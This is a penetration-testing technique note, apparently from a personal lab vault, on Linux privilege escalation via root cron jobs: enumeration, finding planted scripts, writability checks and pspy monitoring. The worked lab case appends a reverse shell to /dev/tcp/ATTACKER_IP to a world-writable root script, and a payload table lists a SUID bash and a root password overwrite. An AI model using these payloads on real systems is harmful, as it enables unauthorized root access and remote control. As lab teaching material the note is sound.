---
type: technique
platform: linux
status: working
fluency: guided
source: thm
updated: 2026-09-04
---

# Cron Jobs

A cron job is only a privilege escalation path when **two** facts hold at once. Either one alone is nothing:

```text
1. A job runs as a more privileged user (usually root)
2. You control something that job reads or executes
```

Fact 1 is enumeration. Fact 2 is the whole exercise, and it is almost never the cron entry itself — those are root-owned by design. It is the **script the entry points at**, or a directory that script reaches through.

> [!important]
> Every step below can come back empty, and empty almost never means "no job exists" here. Root's own crontab is mode 600 and unreadable to you by design, and `2>/dev/null` hides the denial that would have told you so. Read the **Empty** line in each section before you decide cron is closed on this host.

## Where the schedule is written down

**Why now** — you have a shell and the file-permission sweeps came back stock. Those sweeps looked at files sitting still; this is the first look at what the host does on its own, and it costs four reads. What it adds is the one thing no `ls` can give you: a **user field**, naming the account that executes a command. That field is fact 1 written down.

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
```

```bash
crontab -l
```

```bash
ls -la /var/spool/cron/crontabs/
```

- `/etc/crontab` and `/etc/cron.d/` → the only cron files that carry a **user field** between the schedule and the command. Per-user crontabs do not, because the file's location already says whose they are. That field is what you are reading for.
- `crontab -l` → **your** jobs, and only yours. It never shows root's. Running it, seeing nothing, and concluding the host has no cron vector is the single most common way to walk past the answer on this whole page.
- `ls -la /var/spool/cron/crontabs/` → where the per-user files actually live. Expect to be refused; the refusal is the point, because it tells you jobs may exist that you cannot read.

**What you will see**

- **Found** — a line with five schedule fields, then a username, then a command: `* * * * * root /usr/local/bin/cleanup.sh`. In the periodic directories, a filename that is not a package name. Copy the command path out; it is the only thing on the line you can act on.
- **Empty** — split it by file. An empty `crontab -l` is a real negative on **your** jobs and nothing else. An empty `/etc/cron.d/` is a real negative on that directory. A stock `/etc/crontab` is a negative on one file, not on cron. None of the three is a negative on root's crontab, which you have not read and will not read.
- **Error** — `Permission denied` on `/var/spool/cron/crontabs/` is normal and expected: the directory is mode 700 on every healthy system. It is a permission answer, not an absence answer. `no crontab for <user>` means exactly what it says and only about you.
- **Noise** — the default `/etc/crontab` on a Debian-family host is `SHELL=`, `PATH=` and four `run-parts` lines pointing at the periodic directories. Those four are the packaging, not a finding.

**Then** — a command path goes to the writability test below. A bare command name with no `/` in it goes to [[Linux-PATH-Abuse]] instead, and the reason is in the slash section two headings down. Empty everywhere, or `Permission denied`, goes to [[PSPY]] — that is not a fallback, it is where the answer lives on most hosts.

## Which file in the directory is the planted one

**Why now** — you have a periodic directory holding a dozen files and no idea which one a human put there. Package files and planted files are both `root:root`, both `644`, and reading twelve scripts costs more attention than you have. Timestamps separate them in one command.

```bash
ls -lat --time-style=long-iso /etc/cron.d/ /etc/cron.daily/
```

- `-t` → sort by mtime, newest first. This is the entire technique: the planted file rises to the top of its group and package files sink in date order below it.
- `--time-style=long-iso` → forces `YYYY-MM-DD HH:MM` on every line. Plain `ls -l` prints a clock for files under six months old and a **year** for older ones, so the two groups you are comparing are rendered in two different formats and the pattern disappears.
- `-a` → includes `.placeholder`, which is a stock empty file in every one of these directories and never the answer. Seeing it confirms you are reading the directory, not an error.

```text
drwxr-xr-x 2 root root 4096 2026-03-03 07:27 .
-rw-r--r-- 1 root root  139 2026-03-03 07:27 cleanup
-rw-r--r-- 1 root root  396 2024-01-09 06:39 sysstat
-rw-r--r-- 1 root root  201 2020-02-14 11:02 e2scrub_all
-rw-r--r-- 1 root root  102 2020-02-13 09:15 .placeholder
```

**What you will see**

- **Found** — one file whose timestamp matches the **directory's own** mtime, sitting above a block of files dated years earlier. The directory changed when that file was added, so the two dates agreeing is the signature. Name shape confirms it: `e2scrub_all`, `sysstat`, `apt-compat`, `man-db`, `logrotate`, `apport` map to something in `dpkg -l`; `cleanup`, `backup`, `antivirus`, `monitor`, `compress` map to nothing.
- **Empty** — a directory holding only `.placeholder` is genuinely empty and closes that directory. Four empty periodic directories is a real result worth writing down: it eliminates four places and pushes the weight onto `/etc/cron.d/` and the per-user files.
- **Error** — `No such file or directory` for `/etc/cron.d` means cron is not installed at all. Check `systemctl list-timers --all` before accepting that no scheduled work happens; timers are the modern replacement and live nowhere near these directories.
- **Noise** — every date clustered in the same week, on a host built recently, tells you nothing — the packages and the planted file were installed on the same day. Fall back to name shape and read each file.

**Then** — the file you picked out goes to the next section, where you read its entry. If every date is clustered and every name is a package name, treat the directory as closed and go to [[PSPY]]; a job you cannot see on disk is still a job.

## The slash that decides which technique applies

**Why now** — you have an entry in front of you and two different techniques could apply to it. Which one is decided by a single character, and reading it wrong costs the hour you spend attacking the file permissions of a script that is never resolved by path.

```text
SHELL=/bin/bash
PATH=/home/ubuntu:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /usr/local/bin/cleanup.sh
```

| Field | Here | What it buys you |
|---|---|---|
| Schedule | `* * * * *` | every minute — you wait 60s or less per attempt |
| User | `root` | fact 1, satisfied |
| Command | `/usr/local/bin/cleanup.sh` | **contains a `/`** — see below |

```text
root /usr/local/bin/cleanup.sh   ->  absolute path. PATH is NOT consulted to find it.
                                     Target the script's own permissions.

root cleanup.sh                  ->  bare name. PATH IS consulted, left to right.
                                     Plant a file of that name in a writable PATH entry.
```

The bare-name case is also what an **orphaned** entry looks like — an administrator deleted the script and left the schedule behind. A job that fires every minute calling a script that no longer exists is not a dead end; it is the finding, because cron will execute whatever you put where it looks.

A `PATH=` line at the top of the file is worth one glance even in the absolute-path case: it is the `PATH` the *script* will run under, so any bare command **inside** that script resolves through it. Mechanism for both cases: [[Linux-PATH-Abuse]].

## Whether you control anything the job touches

**Why now** — you have a job, a user, and a script path. Fact 1 is settled and fact 2 is not. This is the test that decides whether the entry is an escalation or a dead end, and it is three `ls` calls. Guessing instead of running them is how an afternoon disappears into a file you never had write access to.

```bash
JOB=/usr/local/bin/cleanup.sh
```

```bash
ls -l "$JOB"; ls -ld "$(dirname "$JOB")"; head -40 "$JOB"
```

- `ls -ld` on the **directory** → the half people skip, and often the only half that is open. Write access to the directory lets you delete the script and create your own with the same name, even when the file itself is `root:root` mode `644` and untouchable.
- `head -40` → read it. A script you have not read cannot be paired with anything, and the interesting part is usually a bare command name or a `*` in the first ten lines.
- quoting `"$JOB"` → paths in cron entries contain spaces more often than you expect; unquoted, `ls` reports a missing file and you conclude the entry is orphaned when it is not.

**What you will see**

- **Found** — `-rwxrwxrwx 1 root root` on the file, or `drwxrwxrwx` on the directory, or a group you are in holding `w`. Any one of those is fact 2. In the script body: a `*` in a command's arguments, or a command called with no `/` in front of it.
- **Empty** — `head` printing nothing means the file exists and is zero bytes, which for a live job is itself odd and worth noting. It does not mean you lack permission; that produces an error instead.
- **Error** — `No such file or directory` on a script named by a live entry is a **finding**, not a failure: the entry is orphaned, and if the command is bare-name you own it outright. `Permission denied` from `head` means the script is root-only readable — you cannot audit it, but the directory test above is still valid and still worth running.
- **Noise** — mode `755 root:root` inside a `755 root:root` directory is the normal, correct shape of a system script. It is a clean negative on this entry, not a subtle finding.

**Then** — a writable file goes to the payload section below. A writable directory goes there too, by way of `mv` and a replacement file. A `*` in the script goes to [[Wildcard-Injection]]; a bare command name goes to [[Linux-PATH-Abuse]]. Nothing writable and nothing readable means this entry is closed — go back to the directory listing and take the next candidate, and when the candidates run out, [[PSPY]].

## Worked case — a writable script behind a cron entry

**Why now** — the enumeration above produced a candidate and you want to see the whole chain close once, in order, including the steps that failed. Everything below is one run on one host.

**1. Stock `/etc/crontab`, empty periodic directories.** `cron.hourly`, `cron.weekly` and `cron.monthly` held only `.placeholder`; `cron.daily` held package scripts, all `root:root` and `644` or `755`. Nothing writable. That is a negative result, not a failure — it eliminates four directories and points the remaining attention at `/etc/cron.d/`.

**2. `/etc/cron.d/cleanup`** stood out on both mtime and name, exactly as the listing section describes.

**3. The entry itself is not the target.**

```bash
ls -la /etc/cron.d/cleanup
```

```bash
ls -ld /etc/cron.d
```

Root-owned, mode 644, in a directory you cannot write. An editor opens it and exits without saving — a silent failure that reads exactly like success. Confirm with `ls -la` afterwards: if the mtime has not moved, nothing was written.

**4. The script it points at.**

```bash
cat /usr/local/bin/cleanup.sh
```
```bash
#!/bin/bash
find /tmp -type f -mtime +1 -delete
```

```bash
find /var/tmp -type f -mtime +7 -delete
```

```bash
echo "[cleanup] done at $(date)"
```
```bash
ls -la /usr/local/bin/cleanup.sh
```

```bash
# -rwxrwxrwx 1 root root 122 Mar  3 07:27 /usr/local/bin/cleanup.sh
```

`rwxrwxrwx`, owned by root. Fact 2 satisfied: root executes this file every minute and anyone can rewrite it.

**5. Payload.** Cron gives the job no terminal, so an interactive shell would exit immediately. A reverse shell, appended rather than substituted:

```bash
cp /usr/local/bin/cleanup.sh /tmp/.cleanup.bak
cat >> /usr/local/bin/cleanup.sh << 'EOF'
bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1
EOF
nc -nlvp 6666
```

- `>>` not `>` → the script keeps doing its real job, so nothing on the host visibly breaks and the next tick still succeeds. Overwriting a live system script is how a lab box stops working halfway through.
- quoting the heredoc delimiter as `'EOF'` → stops your **local** shell expanding `$` and backticks before the file is written. Unquoted, `/dev/tcp/...` survives but anything else in the payload is evaluated on the wrong machine.
- the listener must be running **before** the minute ticks. Cron does not retry.

**6. The decoy.** That `PATH=/home/ubuntu:...` line is a real vector *shape* — `find` and `date` are both called bare-name inside the script, so a writable `/home/ubuntu` would mean planting `/home/ubuntu/find` and never touching the script at all. On this host it does not work:

```bash
ls -ld /home/ubuntu
```

```bash
# drwxr-xr-x 5 ubuntu ubuntu     <- you are john. not writable.
```

**What you will see**

- **Found** — a connection on the listener within one interval, and `id` returning `uid=0(root)` on it. With a `chmod +s` payload instead, the confirmation is `ls -l /bin/bash` showing an `s`, no listener involved.
- **Empty** — the interval passes and nothing arrives. Three causes, in the order they actually occur: the listener was not up when the job fired, egress on that port is filtered, or the payload was an interactive shell in a context with no terminal and exited instantly. Wait one more full interval before changing anything — a job on a five-minute timer looks identical to a broken payload for four of those minutes.
- **Error** — the job's own output goes to mail or to `/var/log/syslog`, not to your terminal, so a broken payload is silent. `bash -n /usr/local/bin/cleanup.sh` checks your appended lines for syntax errors without running them.
- **Noise** — the script's own normal output, and a connection from your own testing, both look like success. Confirm with `id` inside the shell, not with the fact that something connected.

**Then** — a root shell goes to [[Shells]] to be stabilised before you work in it. No shell after two intervals means switching the payload away from the network entirely: `chmod +s /bin/bash` then `/bin/bash -p` needs no listener and no egress.

## Payload choice

| Payload | When |
|---|---|
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | default. Cron has no terminal, so an interactive shell dies instantly |
| `chmod +s /bin/bash` then `/bin/bash -p` | no listener, no egress needed; leaves a SUID shell on disk |
| `echo "root:newpass" \| chpasswd` then `su` | when you want a stable credential rather than a shell |
| `cp /bin/bash /tmp/r; chmod +s /tmp/r` | same as above, out of the way of `/bin` |

`nc -e` is usually unavailable — the Debian and Ubuntu `netcat-openbsd` build omits it. Assume the bash `/dev/tcp` form unless you have checked. More options: [[Shells]].

> [!warning]
> `chpasswd` replaces the real root password: it locks out the legitimate administrator and is trivially visible in an audit. Prefer a payload that *adds* access rather than replacing a credential, and keep the backup you took in step 5.

## Finding jobs you cannot see

**Why now** — the readable files came back stock or empty, and you know from the callout at the top that this proves nothing about root's own crontab. There is exactly one way to observe a job you are not permitted to read, and it needs no privilege: watch the process table fast enough to catch the job while it is alive.

```bash
./pspy64 -pf -i 1000 | grep -v "UID=$(id -u)"
```

- `-f` → also print filesystem events. Noisy, but it shows *what the job touched*, which is often how you find the script when the command line itself is a wrapper.
- `-i 1000` → milliseconds between the unconditional `/proc` scans. The scan is a backstop; the inotify half is what actually catches short-lived processes.
- `grep -v "UID=$(id -u)"` → drops your own commands, which otherwise dominate the output and bury the two lines that matter.

**What you will see**

- **Found** — a line carrying `UID=0` and a command you did not start, reappearing on a fixed rhythm. Subtract two timestamps of the same command to get the interval. Copy the path verbatim; it is the next thing you `ls -l`.
- **Empty** — silence is a negative on **short** jobs only. Ten quiet minutes rules out an every-minute job and says nothing about a daily one. On a host with `/proc` mounted `hidepid=1` or `hidepid=2` it says nothing at all, because you cannot see other users' processes; check with `mount | grep proc` before believing the silence.
- **Error** — a syntax error from a file you expected to be a binary means you downloaded a web page instead of the release asset. Check with `file pspy64` before every run.
- **Noise** — lines with `UID=0` and an empty command field are kernel threads, not processes you can influence. A command appearing exactly once is usually a person or a boot-time child.

**Then** — a repeating `UID=0` command goes back to the writability test above with that path as `$JOB`. Flags, the inotify mechanism and the `hidepid` case in full: [[PSPY]].

## Timing

A cron path costs you the interval. A job that fires every minute is a fast win; one that fires daily is usually worth deprioritising against any direct credential — see [[Linux-Run-Sheet#8 — Stop and connect|run sheet step 8]]. On real engagements the daily, weekly and monthly jobs are the common case, and the every-minute job is the lab tell.

## Rarely — worth one command, not worth a step

**Why now** — the schedule files above are empty or unreadable and `pspy` shows nothing on a short watch. Two other schedulers exist on most Linux hosts and neither writes into the directories above.

```bash
atq
```

- One-shot jobs queued with `at`. They are held in a separate spool, never appear in any crontab, and run as the user who queued them. `at -c <id>` prints the job body, including the full environment it will run with.
- An empty queue is the usual answer and takes no time to get.

```bash
ls -la /etc/anacrontab /var/spool/anacron 2>/dev/null
```

- `anacron` exists to run daily and weekly work on machines that are not powered on continuously. On a laptop or a lab image it is often the thing actually executing the `cron.daily` scripts, which changes who runs them and when.
- A writable entry here has exactly the same payoff as a writable cron entry, and nothing in the sections above would have shown it to you.

**What you will see**

- **Found** — a queued job you can read, or an `anacron` table naming a script you can write to.
- **Empty** — the normal answer for both. They are lottery tickets, not steps.
- **Error** — `atq: command not found` means the scheduler is not installed, which is a clean answer rather than a denial.
- **Noise** — `/etc/anacrontab` ships with three stock entries pointing at the standard `cron.daily`, `cron.weekly` and `cron.monthly` directories. Those are stock; a fourth line is not.

**Then** — a writable target from either scheduler goes back to the payload section above, unchanged. Nothing here means the job you are chasing runs from a unit file instead, and that is step 5 of [[Linux-Run-Sheet]].

## Reading the output

Two things that span this whole note rather than any one command.

**The mode column and the owner column answer different questions, and you need both.** `root root` is what makes a file valuable — it means root executes it. `rwxrwxrwx` is what makes it reachable. A world-writable file owned by *you* is worth nothing here, and a root-owned file you cannot write is worth nothing either. The finding is the pair.

**A negative from this note is narrow.** Everything above reads files or watches processes for as long as you were patient. It cannot see a job whose interval is longer than your capture, and it cannot see root's crontab at all. "No cron vector" is a claim this note is not able to support; the honest version is "no cron vector I could observe in N minutes", and it should send you to the other categories in [[Linux-Privilege-Escalation]] rather than back here.

## Next

- [[PSPY]] — the schedule you are not permitted to read, caught while it runs
- [[Linux-PATH-Abuse]] — the bare-name branch: the cron command has no `/` in it
- [[Shells]] — choosing and stabilising the payload the job will run

## Gaps

- **No systemd timer note.** Timers are the modern equivalent, enumerated differently (`systemctl list-timers --all`), and the writable-unit variant is listed as unwritten in [[Linux-Privilege-Escalation]].
- **Getting `pspy` onto a box with no egress.** [[PSPY]] covers the tool; both it and [[File-Transfer]] stop at "serve it over HTTP".
- **No worked bare-name cron case.** The mechanism is in [[Linux-PATH-Abuse]] but no box in this vault has landed it through cron rather than SUID.
- Nothing on `cron.allow` / `cron.deny`, or on what a defender sees in `/var/log/syslog` when a job's command line changes.
